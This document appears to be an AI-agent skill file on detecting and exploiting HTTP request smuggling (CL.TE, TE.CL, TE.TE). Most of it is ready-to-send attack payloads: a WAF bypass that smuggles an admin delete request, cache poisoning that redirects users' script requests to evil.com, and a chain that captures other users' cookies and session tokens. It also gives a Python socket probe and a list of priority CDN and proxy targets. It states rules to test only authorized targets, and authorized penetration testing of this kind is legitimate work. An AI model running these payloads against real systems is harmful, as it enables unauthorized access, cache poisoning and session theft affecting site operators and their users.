---
name: http-smuggling
description: >
  HTTP Request Smuggling detection and exploitation. Covers CL.TE, TE.CL, TE.TE
  variants, front-end/back-end parsing discrepancies, WAF bypass via smuggling,
  and cache poisoning chaining. Uses burpsuite + fetch for timing and differential
  response analysis.
metadata:
  tags: "http-smuggling,cl-te,te-cl,te-te,request-smuggling,transfer-encoding,waf-bypass"
  category: "offensive-security"
---

# HTTP Request Smuggling — Detection & Exploitation

> HTTP Smuggling exploits parsing differences between front-end (proxy/CDN/WAF)
> and back-end servers. A single ambiguous request can poison caches, bypass
> WAF rules, or hijack other users' requests.

## 1. Quick Detection — 3-Variant Test

### CL.TE (Content-Length wins front-end, Transfer-Encoding wins back-end)

```
POST / HTTP/1.1
Host: {target}
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

**Detection**: If backend times out, it's waiting for the "G" chunk → CL.TE confirmed.

### TE.CL (Transfer-Encoding wins front-end, Content-Length wins back-end)

```
POST / HTTP/1.1
Host: {target}
Content-Length: 4
Transfer-Encoding: chunked

5c
GET /admin HTTP/1.1
Host: {target}
Content-Length: 15

x=1
0


```

**Detection**: NEXT request to the same connection returns 404 or admin page.

### TE.TE (Both use Transfer-Encoding, but parse differently)

```
POST / HTTP/1.1
Host: {target}
Content-Length: 4
Transfer-Encoding: chunked
Transfer-Encoding: x

5c
GET /admin HTTP/1.1
Host: {target}


0


```

## 2. Attack Chains

### Smuggling → WAF Bypass

```
POST / HTTP/1.1
Host: {target}
Content-Length: 49
Transfer-Encoding: chunked

0

GET /admin/delete?user=admin HTTP/1.1
X-Ignore: X
```

Front-end (WAF) sees: POST / (safe)
Back-end sees: GET /admin/delete?user=admin → executes!

### Smuggling → Cache Poisoning

```
POST / HTTP/1.1
Host: {target}
Content-Length: 70
Transfer-Encoding: chunked

0

GET /static/js/app.js HTTP/1.1
X-Forwarded-Host: evil.com

```

Next user requesting /static/js/app.js gets redirected to evil.com.

### Smuggling → Credential Hijacking

```
POST /login HTTP/1.1
Host: {target}
Content-Length: 80
Transfer-Encoding: chunked

0

GET / HTTP/1.1
X: X
```

NEXT user's request body gets appended to "GET /" → their cookies/session
token appears in the response to the smuggled request.

## 3. Automated Test Matrix

### Step 1: Confirm HTTP/1.1 with Connection Keep-Alive

```
Fetch: GET / HTTP/1.1
  Headers:
    Connection: keep-alive

Expect: Connection: keep-alive in response
```

### Step 2: Send CL.TE probe (7-second timer)

```
Burp: POST / HTTP/1.1 (use single connection)
  Content-Length: 6
  Transfer-Encoding: chunked

  0

  G
```

**Timing check**:
- Response in < 1s: back-end ignored Transfer-Encoding → CL.CL (not vulnerable)
- Response in 5-7s: back-end waiting for next chunk (the "G") → **CL.TE VULNERABLE**
- Immediate error: front-end rejected chunked encoding

### Step 3: Send TE.CL probe

```
Burp: POST / HTTP/1.1
  Content-Length: 4
  Transfer-Encoding: chunked

  5c
  GET /404test HTTP/1.1
  Host: {target}

  0


```

Then immediately send:
```
GET /anything HTTP/1.1
Host: {target}
```

If response is 404 → TE.CL VULNERABLE (the smuggled GET /404test was processed)

### Step 4: TE.TE obfuscation test

```
POST / HTTP/1.1
Host: {target}
Content-Length: 4
Transfer-Encoding: chunked
Transfer-Encoding: identity
Transfer-Encoding : chunked

5c
GET /smuggled HTTP/1.1
Host: {target}

0


```

## 4. Connection Reuse (CRITICAL)

Smuggling REQUIRES connection reuse. Detection method:

```python
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("{target_host}", 443 if "{target}".startswith("https") else 80))
# Send probe 1
s.send(b"POST / HTTP/1.1\r\nHost: {target_host}\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG")
# Read response 1
r1 = s.recv(4096)
# Send FOLLOW-UP immediately (same TCP connection)
s.send(b"GET / HTTP/1.1\r\nHost: {target_host}\r\n\r\n")
# Read response 2
r2 = s.recv(4096)
# If r2 is NOT the normal homepage, smuggling confirmed
```

## 5. Priority Targets

| Target | Smuggling Likelihood | Why |
|--------|---------------------|-----|
| Cloudflare → origin | High | CF uses different HTTP parser than Apache/Nginx |
| AWS ALB → backend | High | ALB + varied backends = parsing gaps |
| Nginx → uWSGI/gunicorn | Medium | Different chunked encoding handling |
| Varnish → Apache | High | Classic CL.TE vulnerability |
| Any CDN → origin | Medium | Different HTTP stacks |

## 6. Output

```
findings/
└── smuggling/
    ├── _smuggling_probes.md       # All probes sent + responses
    ├── _smuggling_vulnerable.json  # Confirmed vulnerable endpoints
    └── _poc/
        ├── cl_te_poc.py            # CL.TE PoC script
        └── te_cl_poc.py            # TE.CL PoC script
```

## 7. Rules

```
⛔ Only test on authorized targets
⛔ Use single connection — smuggling doesn't work across connections
⛔ Test at off-peak hours — can affect OTHER users' requests
⛔ Clean up cache poison after PoC (send cleanup request)
⛔ NEVER smuggle destructive requests (DELETE, DROP)
```
